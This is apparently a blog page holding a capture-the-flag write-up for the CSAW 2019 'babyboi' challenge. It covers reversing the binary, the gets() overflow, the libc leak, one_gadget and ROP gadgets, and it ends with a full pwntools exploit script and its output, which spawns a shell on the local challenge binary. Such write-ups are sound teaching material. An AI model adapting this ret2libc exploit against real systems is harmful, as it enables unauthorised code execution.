@@ -1,0 +1,253 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content>
+<meta name=description content="CSAW 2019 'babyboi' challenge writeup.">
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://anvbis.github.io/posts/csaw-2019-babyboi/>
+<title>
+CSAW 2019 :: Babyboi :: Anubis
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=/main.04ccab17a090ab7631f283645aff8adfdbd0eb8d6fc2738d01581aa99a6ce4ef.css>
+<meta itemprop=name content="CSAW 2019 :: Babyboi">
+<meta itemprop=description content="CSAW 2019 'babyboi' challenge writeup."><meta itemprop=datePublished content="2021-08-14T00:00:00+00:00">
+<meta itemprop=dateModified content="2021-08-14T00:00:00+00:00">
+<meta itemprop=wordCount content="906"><meta itemprop=image content="https://anvbis.github.io">
+<meta itemprop=keywords content>
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://anvbis.github.io">
+<meta name=twitter:title content="CSAW 2019 :: Babyboi">
+<meta name=twitter:description content="CSAW 2019 'babyboi' challenge writeup.">
+<meta property="og:title" content="CSAW 2019 :: Babyboi">
+<meta property="og:description" content="CSAW 2019 'babyboi' challenge writeup.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://anvbis.github.io/posts/csaw-2019-babyboi/"><meta property="og:image" content="https://anvbis.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-08-14T00:00:00+00:00">
+<meta property="article:modified_time" content="2021-08-14T00:00:00+00:00"><meta property="og:site_name" content="Anubis">
+<meta property="article:section" content="ROP">
+<meta property="article:section" content="CTF">
+<meta property="article:section" content="Linux">
+<meta property="article:published_time" content="2021-08-14 00:00:00 +0000 UTC">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1JEBQ6E1CF"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-1JEBQ6E1CF')</script>
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text>anvbis</span>
+<span class=logo__cursor>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=/posts>Blog</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info>
+</p>
+</div>
+<article>
+<h2 class=post-title><a href=https://anvbis.github.io/posts/csaw-2019-babyboi/>CSAW 2019 :: Babyboi</a></h2>
+<div class=post-content>
+<h2 id=reverse-engineering>Reverse Engineering</h2>
+<p>Let&rsquo;s use the <code>file</code> command to get a little bit of insight into this executable. Note that it is a 64-bit linux binary.</p>
+<pre><code>$ file ./baby_boi
+baby_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1ff55dce2efc89340b86a666bba5e7ff2b37f62, not stripped
+</code></pre><p>We can also use pwntools' <code>checksec</code> tool to see what exploit protections it has in place. Note that the NX bit is set, but there is no stack canary, and PIE is disabled.</p>
+<p>This means a couple things for us:</p>
+<ul>
+<li>We can&rsquo;t execute shellcode on the stack.</li>
+<li>Probably vulnerable to a BOF as there is no stack canary.</li>
+<li>We might be able to build a ROP chain somewhere.</li>
+</ul>
+<pre><code>checksec ./baby_boi 
+[*] './baby_boi'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>Let&rsquo;s run the executable and see what happens. The binary appears to leak some address (kinda looks like an address in <code>libc</code>, we&rsquo;ll definitely be able to use this).</p>
+<p>It also appears to prompt us for input. This is likely where we&rsquo;ll find a vulnerability we can exploit.</p>
+<pre><code>$ ./baby_boi
+Hello!
+Here I am: 0x7f6b6221ecf0
+asdfasdf
+</code></pre><p>Reversing the <code>main</code> function reveals that the address leaked is indeed within <code>libc</code>, it points to <code>printf</code>. We&rsquo;ll keep this in mind for later.</p>
+<pre><code>0x004006fc      488b05e50820.  mov rax, qword [reloc.printf] ; sym..got
+0x00400703      4889c6         mov rsi, rax
+0x00400706      488d3dae0000.  lea rdi, str.Here_I_am:__p_n ; 0x4007bb ; &quot;Here I am: %p\n&quot;
+0x0040070d      b800000000     mov eax, 0
+0x00400712      e879feffff     call sym..plt.got
+</code></pre><p>Towards the end of the <code>main</code> function a call to <code>gets</code> is made. Wonderful, we&rsquo;ve found a buffer overflow vulnerability.</p>
+<pre><code>0x00400717      488d45e0       lea rax, [s]
+0x0040071b      4889c7         mov rdi, rax                ; char *s
+0x0040071e      b800000000     mov eax, 0
+0x00400723      e848feffff     call sym.imp.gets           ; char *gets(char *s)
+0x00400728      b800000000     mov eax, 0
+0x0040072d      c9             leave
+0x0040072e      c3             ret
+</code></pre><h2 id=information-gathering>Information Gathering</h2>
+<p>First, let&rsquo;s find the offset of the return address from the input buffer <code>*s</code> where <code>gets</code> stores our user input.</p>
+<p>This is a small script that attaches the process to GDB before sending a large cyclic pattern of bytes. We can use this to determine the return address' offset.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
+
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+
+r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./baby_boi&#39;</span>)
+gdb<span style=color:#f92672>.</span>attach(r)
+
+r<span style=color:#f92672>.</span>clean()
+r<span style=color:#f92672>.</span>writeline(cyclic(<span style=color:#ae81ff>300</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>))
+
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>After continuing in GDB, and looking at the top of the stack we can see we&rsquo;ve overwritten the return address with our garbage data.</p>
+<pre><code> ► 0x40072e &lt;main+167&gt;    ret    &lt;0x6161616161616166&gt;
+</code></pre><p>Let&rsquo;s use pwntools' <code>cyclic_find</code> function to calculate the offset of the return address from the start of our input.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py>In [<span style=color:#ae81ff>2</span>]: cyclic_find(<span style=color:#ae81ff>0x6161616161616166</span>, n<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>)
+Out[<span style=color:#ae81ff>2</span>]: <span style=color:#ae81ff>40</span>
+</code></pre></div><p>Now, let&rsquo;s do some investigation within GDB. Using the <code>info proc map</code> command we can see the start address where <code>libc</code> is loaded, we&rsquo;ll use this to calculate the offset of <code>printf</code> from the start of <code>libc</code>.</p>
+<pre><code>pwndbg&gt; info proc map
+process 1332
+Mapped address spaces:
+
+          Start Addr           End Addr       Size     Offset objfile
+            0x400000           0x401000     0x1000        0x0 ./baby_boi
+            0x600000           0x601000     0x1000        0x0 ./baby_boi
+            0x601000           0x602000     0x1000     0x1000 ./baby_boi
+      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
+
+...
+
+pwndbg&gt; p printf
+$1 = {int (const char *, ...)} 0x7ffff7e45cf0 &lt;__printf&gt;
+pwndbg&gt; p/x 0x7ffff7e45cf0 - 0x7ffff7def000
+$4 = 0x56cf0
+</code></pre><p>We can use a wonderful tool called <code>one_gadget</code> to get an address in our <code>libc</code> that will automatically give us a shell if we return to it (provided that the right conditions are met).</p>
+<pre><code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so                                                        130 ⨯
+0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [r13] == NULL || r13 == NULL
+
+0xcbd1d execve(&quot;/bin/sh&quot;, r12, rdx)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xcbd20 execve(&quot;/bin/sh&quot;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+</code></pre><p>We&rsquo;ll use that first gadget, located at <code>0xcbd1a</code> in combination with our leaked <code>libc</code> address to get a shell.</p>
+<p>Using <code>ropper</code> we can find a gadget that will allow us to setup the correct conditions for our magic gadget.</p>
+<pre><code>ropper --file ./baby_boi --search 'pop r12'
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r12
+
+[INFO] File: ./baby_boi
+0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
+</code></pre><h2 id=exploit-development>Exploit Development</h2>
+<p>Now it&rsquo;s time to develop our exploit. Here&rsquo;s an outline of the main steps we want to take:</p>
+<ul>
+<li>Capture the leaked <code>printf</code> address.</li>
+<li>Calculate the start address of <code>libc</code> using the leak and the offset of <code>printf</code> we calculated earlier.</li>
+<li>Overwrite the return address with the address of our setup gadget.</li>
+<li>Return to <code>libc</code> and our magic gadget to get a shell.</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#75715e>#!/usr/bin/env python3</span>
+
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
+
+
+<span style=color:#e6db74>&#39;&#39;&#39;
+</span><span style=color:#e6db74>0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
+</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+setup <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x40078c</span>
+
+<span style=color:#e6db74>&#39;&#39;&#39;
+</span><span style=color:#e6db74>0xcbd1a execve(&#34;/bin/sh&#34;, r12, r13)
+</span><span style=color:#e6db74>constraints:
+</span><span style=color:#e6db74>  [r12] == NULL || r12 == NULL
+</span><span style=color:#e6db74>  [r13] == NULL || r13 == NULL
+</span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+magic <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0cbd1a</span>
+
+
+pad <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>40</span>
+
+
+elf <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./baby_boi&#39;</span>)
+rop <span style=color:#f92672>=</span> ROP(elf)
+
+rop<span style=color:#f92672>.</span>raw(setup)
+rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># pop r12</span>
+rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># pop r13</span>
+rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># pop r14</span>
+rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># pop r15</span>
+
+
+r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./baby_boi&#39;</span>)
+
+r<span style=color:#f92672>.</span>readuntil(<span style=color:#e6db74>&#39;Here I am: &#39;</span>)
+libc <span style=color:#f92672>=</span> eval(r<span style=color:#f92672>.</span>readline()[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]) <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x56cf0</span>
+rop<span style=color:#f92672>.</span>raw(libc <span style=color:#f92672>+</span> magic)
+
+r<span style=color:#f92672>.</span>writeline(pad <span style=color:#f92672>+</span> rop<span style=color:#f92672>.</span>chain())
+r<span style=color:#f92672>.</span>interactive()
+</code></pre></div><p>And finally, here&rsquo;s the exploit in action.</p>
+<pre><code>$ ./exploit.py 
+[*] './baby_boi'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Loaded 14 cached gadgets for './baby_boi'
+[+] Starting local process './baby_boi': pid 2253
+[*] Switching to interactive mode
+$ cat flag.txt
+csaw19{babyboi}
+$ 
+[*] Stopped process './baby_boi' (pid 2253)
+</code></pre>
+</div>
+</article>
+<hr>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://anvbis.github.io/categories/rop/>ROP</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/ctf/>CTF</a></span>
+<span class=tag><a href=https://anvbis.github.io/categories/linux/>Linux</a></span>
+</p>
+</div>
+</main>
+</div>
+<footer class=footer>
+</footer>
+</div>
+<script type=text/javascript src=/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js integrity="sha512-cvPNsXV+ZUxaoTKaQmnqao17N1E947nVTXpcolVz+zpk+HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
+</body>
+</html>
